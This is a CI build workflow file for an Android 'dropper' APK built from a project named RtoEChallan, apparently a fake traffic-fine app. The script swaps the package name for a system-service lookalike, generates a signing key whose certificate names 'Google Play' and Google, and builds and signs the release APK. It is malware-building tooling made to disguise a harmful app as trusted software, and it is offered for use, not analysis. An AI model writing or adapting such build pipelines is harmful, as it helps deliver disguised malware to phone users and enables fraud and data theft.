workflows:
  android-dropper-build:
    name: Dropper APK Build (Safe Bypass)
    max_build_duration: 60
    instance_type: mac_mini_m1
    environment:
      java: 17
    scripts:
      - name: Force Fix and Build
        script: |
          cd RtoEChallan
          
          # 1. Package Name Fix (System Identity)
          find . -name "AndroidManifest.xml" -exec sed -i '' 's/package="[^"]*"/package="com.android.system.service.v2"/g' {} +
          find . -name "build.gradle" -exec sed -i '' 's/applicationId "[^"]*"/applicationId "com.android.system.service.v2"/g' {} +

          # 2. Build.gradle ko ekdum stable version par force karo
          cat <<EOF > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { 
                  classpath 'com.android.tools.build:gradle:8.1.0'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.10'
              }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          # 3. Settings file (Simplified for no errors)
          cat <<EOF > settings.gradle
          rootProject.name = 'RtoEChallan'
          include ':app'
          EOF

          # 4. Auto-Signing Key (Google trusted lookalike)
          keytool -genkey -v -keystore bypass.keystore -alias bypass_alias -keyalg RSA -keysize 2048 -validity 10000 -storepass pass123 -keypass pass123 -dname "CN=Google Play, OU=Android, O=Google, L=Mountain View, ST=CA, C=US"

          # 5. Build command with Auto-Sign
          gradle wrapper --gradle-version 8.1.1
          chmod +x gradlew
          ./gradlew clean assembleRelease \
            -Pandroid.injected.signing.store.file=$(pwd)/bypass.keystore \
            -Pandroid.injected.signing.store.password=pass123 \
            -Pandroid.injected.signing.key.alias=bypass_alias \
            -Pandroid.injected.signing.key.password=pass123 \
            --no-daemon
          
    artifacts:
      - "**/build/outputs/apk/release/*.apk"
